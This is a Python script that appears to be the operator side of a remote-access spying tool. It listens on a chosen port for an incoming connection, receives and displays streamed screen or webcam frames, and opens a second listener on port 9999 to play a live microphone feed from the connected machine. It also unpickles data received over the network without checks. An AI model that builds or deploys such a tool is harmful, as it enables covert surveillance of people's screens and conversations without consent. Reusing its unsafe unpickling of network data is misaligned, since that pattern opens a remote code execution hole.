import pyaudio
import socket
import pickle
import struct
import cv2

from threading import Thread
from os import system, path
from ctypes  import windll
from colorama import Fore


""" Functional """
class Server:
    def __init__(self):
        try:
            self.HOST = socket.gethostbyname(socket.gethostname())
            self.PORT = int(input(f"Enter port: "))
            system("cls")
        except ValueError:
            print(f"\n{r}Введено не число!{w}")
            Server.__init__(self)

    def build(self):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.bind(("", self.PORT))
        self.client_socket.listen(5)

        print(f'{plus}{wl}Socket created')
        print(f'{plus}{wl}Socket bind complete\n')
        print(f"{dol}{wl}HOST - {b}{self.HOST}\n{dol}{wl}PORT - {b}{self.PORT}\n")

    def sock_accept(self):
        print(f'{sharp}{wl}Socket now listening 🎲\n')

        self.conn, self.addr = self.client_socket.accept()
        print(f"{plus}{wl}Connected - {r}{self.addr[0]} ({self.addr[1]})\n\n{wl}")

    def get_screen(self):
        self.__running_micro = True
        thr = Thread(target=self.get_micro).start()
        
        payload_size = struct.calcsize('>L')
        data = b""
        while True:
            break_loop = False
            while len(data) < payload_size:
                received = self.conn.recv(4096)
                if received == b'':
                    self.conn.close()
                    break_loop = True
                    break
                data += received

            if break_loop:
                break

            packed_msg_size = data[:payload_size]
            data = data[payload_size:]

            msg_size = struct.unpack(">L", packed_msg_size)[0]

            while len(data) < msg_size:
                data += self.conn.recv(4096)

            frame_data = data[:msg_size]
            data = data[msg_size:]

            frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            cv2.imshow(str(self.addr), frame)
            if cv2.waitKey(1) == ord("q"):
                self.__running_micro = False
                cv2.destroyAllWindows()
                break

    def get_micro(self):
        PORT = 9999

        chunk = 8192
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        output=True,
                        frames_per_buffer=chunk)

        server_socket_m = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket_m.bind(("", PORT))
        server_socket_m.listen(5)
        conn, addr = server_socket_m.accept()
        
        while self.__running_micro:
            try:
                data = conn.recv(32768)
                # if data == b"":
                #     continue
                stream.write(data,chunk)
            except:
                self.__running_micro = False

        server_socket_m.close()


""" Variables """
g = Fore.LIGHTGREEN_EX
r = Fore.LIGHTRED_EX
m = Fore.LIGHTMAGENTA_EX
y = Fore.LIGHTYELLOW_EX
wl = Fore.LIGHTWHITE_EX
b = Fore.LIGHTBLUE_EX
w = Fore.WHITE

plus = g + "[+] " + w
minus = r + "[-] " + w
sharp = m + "[#] " + w
dol = y + "[$] " + w

""" Start """
while True:
    try:
        server = Server()
        server.build()
        server.sock_accept()
        server.get_screen()
        print(f"{minus}Disconnect")
    except Exception as e:
        print(f"{r}{e}\n{w}")